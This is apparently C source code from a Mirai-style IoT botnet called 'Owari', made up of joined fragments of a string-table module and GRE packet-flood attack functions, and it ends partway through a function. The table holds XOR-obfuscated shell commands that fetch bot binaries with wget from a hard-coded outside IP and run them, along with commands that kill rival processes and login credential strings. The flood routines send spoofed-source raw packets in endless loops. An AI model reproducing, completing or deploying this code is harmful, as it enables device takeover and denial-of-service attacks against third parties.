void rand_alpha_str(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
	table_unlock_val(OWARI_RANDOM);
    char alpha_set[32];
    strcpy(alpha_set,table_retrieve_val(OWARI_RANDOM, NULL));
    while(len--)
        *str++ = alpha_set[rand_next() % util_strlen(alpha_set)];
	table_lock_val(OWARI_RANDOM);
}
#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdedefbaf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(OWARI_PORT, "\x5E\xD8", 2); // 2700
    add_entry(OWARI_BOT_DEPLOY, "\x12\x3B\x38\x38\x3B\x23\x74\x20\x23\x3D\x20\x20\x31\x26\x7A\x37\x3B\x39\x7B\x65\x67\x67\x63\x03\x3D\x37\x3F\x31\x30\x54", 30);
    add_entry(OWARI_SHELL, "\x27\x3C\x31\x38\x38\x54", 6);
    add_entry(OWARI_ENABLE, "\x31\x3A\x35\x36\x38\x31\x54", 7);
    add_entry(OWARI_SYSTEM, "\x27\x2D\x27\x20\x31\x39\x54", 7);
    add_entry(OWARI_SH, "\x27\x3C\x54", 3);
    add_entry(OWARI_BUSYBOX, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 19);
    add_entry(OWARI_NOTFOUND, "\x1B\x03\x15\x06\x1D\x6E\x74\x35\x24\x24\x38\x31\x20\x74\x3A\x3B\x20\x74\x32\x3B\x21\x3A\x30\x54", 24);
    add_entry(OWARI_ERROR1, "\x3A\x37\x3B\x26\x26\x31\x37\x20\x54", 9);
    add_entry(OWARI_PS, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x24\x27\x54", 16);
    add_entry(OWARI_KILL, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x3F\x3D\x38\x38\x74\x79\x6D\x74\x54", 22);
    add_entry(OWARI_PROC, "\x7B\x24\x26\x3B\x37\x7B\x54", 7);
    add_entry(OWARI_EXE, "\x7B\x31\x2C\x31\x54", 5);
    add_entry(OWARI_FOUND, "\x7B\x32\x30\x54", 4);
    add_entry(OWARI_MAPS, "\x7B\x39\x35\x24\x27\x54", 6);
    add_entry(OWARI_TCP, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x20\x37\x24\x54", 14);
	add_entry(OWARI_STATUS, "\x7B\x27\x20\x35\x20\x21\x27\x54", 8);
	add_entry(OWARI_MEME, "\x7A\x35\x3A\x3D\x39\x31\x54", 7);
    add_entry(OWARI_ROUTE, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x26\x3B\x21\x20\x31\x54", 16);
	add_entry(OWARI_PASSWORD, "\x35\x27\x27\x23\x3B\x26\x30\x54", 8);
    add_entry(OWARI_GABEN, "\x00\x07\x3B\x21\x26\x37\x31\x74\x11\x3A\x33\x3D\x3A\x31\x74\x05\x21\x31\x26\x2D\x54", 21);
    add_entry(OWARI_RESOLV, "\x7B\x31\x20\x37\x7B\x26\x31\x27\x3B\x38\x22\x7A\x37\x3B\x3A\x32\x54", 17);
    add_entry(OWARI_NAMESERVER, "\x3A\x35\x39\x31\x27\x31\x26\x22\x31\x26\x74\x54", 12);
	add_entry(OWARI_CALL, "\x7B\x30\x31\x22\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 14);
	add_entry(OWARI_CALL2, "\x7B\x30\x31\x22\x7B\x39\x3D\x27\x37\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 19);
	add_entry(OWARI_PASSWORD2, "\x24\x36\x36\x32\x2A\x37\x21\x45", 8);
	add_entry(OWARI_LOGIN, "\x3B\x33\x3D\x3A\x54", 5);
	add_entry(OWARI_ENTER, "\x31\x3A\x20\x31\x26\x54", 6);
	add_entry(OWARI_RANDOM, "\x65\x33\x36\x35\x60\x37\x30\x3B\x39\x61\x67\x3A\x3C\x24\x65\x66\x31\x3D\x64\x3F\x32\x3E\x54", 23);
    
    add_entry(OWARI_UPNP_1, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x35\x26\x39\x74\x79\x1B\x74\x79\x74\x6A\x74\x19\x1F\x06\x0D\x17\x20\x62\x16\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x19\x1F\x06\x0D\x17\x20\x62\x16\x6F\x74\x7A\x7B\x19\x1F\x06\x0D\x17\x20\x62\x16\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 175);
    add_entry(OWARI_UPNP_2, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x35\x26\x39\x61\x74\x79\x1B\x74\x79\x74\x6A\x74\x03\x63\x66\x3A\x27\x11\x06\x38\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x03\x63\x66\x3A\x27\x11\x06\x38\x6F\x74\x7A\x7B\x03\x63\x66\x3A\x27\x11\x06\x38\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 176);
    add_entry(OWARI_UPNP_3, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x35\x26\x39\x62\x74\x79\x1B\x74\x79\x74\x6A\x74\x01\x64\x04\x3F\x17\x60\x0E\x05\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x01\x64\x04\x3F\x17\x60\x0E\x05\x6F\x74\x7A\x7B\x01\x64\x04\x3F\x17\x60\x0E\x05\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 176);
    add_entry(OWARI_UPNP_4, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x35\x26\x39\x63\x74\x79\x1B\x74\x79\x74\x6A\x74\x16\x3F\x6C\x67\x18\x2D\x03\x36\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x16\x3F\x6C\x67\x18\x2D\x03\x36\x6F\x74\x7A\x7B\x16\x3F\x6C\x67\x18\x2D\x03\x36\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 176);
    add_entry(OWARI_UPNP_5, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x39\x62\x6C\x3F\x74\x79\x1B\x74\x79\x74\x6A\x74\x6C\x1F\x20\x31\x36\x0C\x33\x1C\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x6C\x1F\x20\x31\x36\x0C\x33\x1C\x6F\x74\x7A\x7B\x6C\x1F\x20\x31\x36\x0C\x33\x1C\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 176);
    add_entry(OWARI_UPNP_6, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x39\x3D\x24\x27\x74\x79\x1B\x74\x79\x74\x6A\x74\x24\x1A\x1B\x33\x3E\x38\x25\x63\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x24\x1A\x1B\x33\x3E\x38\x25\x63\x6F\x74\x7A\x7B\x24\x1A\x1B\x33\x3E\x38\x25\x63\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 176);
    add_entry(OWARI_UPNP_7, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x39\x24\x27\x38\x74\x79\x1B\x74\x79\x74\x6A\x74\x13\x64\x12\x25\x3B\x01\x03\x39\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x13\x64\x12\x25\x3B\x01\x03\x39\x6F\x74\x7A\x7B\x13\x64\x12\x25\x3B\x01\x03\x39\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 176);
    add_entry(OWARI_UPNP_8, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x24\x24\x37\x74\x79\x1B\x74\x79\x74\x6A\x74\x07\x16\x0C\x1A\x30\x07\x3B\x1E\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x07\x16\x0C\x1A\x30\x07\x3B\x1E\x6F\x74\x7A\x7B\x07\x16\x0C\x1A\x30\x07\x3B\x1E\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 175);
    add_entry(OWARI_UPNP_9, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x27\x3C\x60\x74\x79\x1B\x74\x79\x74\x6A\x74\x22\x0C\x6C\x06\x31\x12\x66\x13\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x22\x0C\x6C\x06\x31\x12\x66\x13\x6F\x74\x7A\x7B\x22\x0C\x6C\x06\x31\x12\x66\x13\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 175);
    add_entry(OWARI_UPNP_10, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x27\x24\x37\x74\x79\x1B\x74\x79\x74\x6A\x74\x18\x1D\x33\x1A\x67\x62\x27\x39\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x18\x1D\x33\x1A\x67\x62\x27\x39\x6F\x74\x7A\x7B\x18\x1D\x33\x1A\x67\x62\x27\x39\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 175);
    add_entry(OWARI_UPNP_11, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x23\x33\x31\x20\x74\x3C\x20\x20\x24\x6E\x7B\x7B\x65\x6C\x61\x7A\x66\x60\x62\x7A\x65\x61\x66\x7A\x65\x63\x67\x7B\x36\x3D\x3A\x27\x7B\x3B\x23\x35\x26\x3D\x7A\x2C\x6C\x62\x74\x79\x1B\x74\x79\x74\x6A\x74\x16\x64\x3D\x35\x24\x1E\x1D\x1D\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x3C\x39\x3B\x30\x74\x63\x63\x63\x74\x16\x64\x3D\x35\x24\x1E\x1D\x1D\x6F\x74\x7A\x7B\x16\x64\x3D\x35\x24\x1E\x1D\x1D\x74\x3B\x23\x35\x26\x3D\x7A\x36\x35\x37\x3F\x30\x3B\x3B\x26\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 175);
    
    add_entry(OWARI_CLEAN_DEVICE, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x37\x30\x74\x7B\x20\x39\x24\x7B\x6F\x74\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x26\x39\x74\x79\x26\x32\x74\x19\x1F\x06\x0D\x17\x20\x62\x16\x74\x03\x63\x66\x3A\x27\x11\x06\x38\x74\x01\x64\x04\x3F\x17\x60\x0E\x05\x74\x16\x3F\x6C\x67\x18\x2D\x03\x36\x74\x6C\x1F\x20\x31\x36\x0C\x33\x1C\x74\x24\x1A\x1B\x33\x3E\x38\x25\x63\x74\x13\x64\x12\x25\x3B\x01\x03\x39\x74\x07\x16\x0C\x1A\x30\x07\x3B\x1E\x74\x22\x0C\x6C\x06\x31\x12\x66\x13\x74\x18\x1D\x33\x1A\x67\x62\x27\x39\x74\x16\x64\x3D\x35\x24\x1E\x1D\x1D\x6F\x74\x24\x3F\x3D\x38\x38\x74\x79\x6D\x74\x0C\x65\x6D\x1D\x66\x67\x6D\x65\x66\x60\x01\x1D\x01\x6F\x74\x24\x3F\x3D\x38\x38\x74\x79\x6D\x74\x16\x15\x6C\x17\x35\x6F\x74\x24\x3F\x3D\x38\x38\x74\x79\x6D\x74\x1A\x3D\x13\x13\x31\x06\x62\x6D\x2C\x30\x6F\x74\x24\x3F\x3D\x38\x38\x74\x79\x6D\x74\x65\x67\x67\x63\x07\x3B\x26\x35\x18\x1B\x15\x10\x11\x06\x54", 248);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"
static ipv4_t get_dns_resolver(void);

void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        greh->protocol = htons(ETH_P_IP);
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_greeth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct ethhdr *ethh;
        struct iphdr *greiph;
        struct udphdr *udph;
        uint32_t ent1, ent2, ent3;
        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        ethh = (struct ethhdr *)(greh + 1);
        greiph = (struct iphdr *)(ethh + 1);
        udph = (struct udphdr *)(greiph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        greh->protocol = htons(PROTO_GRE_TRANS_ETH);
        ethh->h_proto = htons(ETH_P_IP);
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct ethhdr *ethh = (struct ethhdr *)(greh + 1);
            struct iphdr *greiph = (struct iphdr *)(ethh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            uint32_t ent1, ent2, ent3;
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;
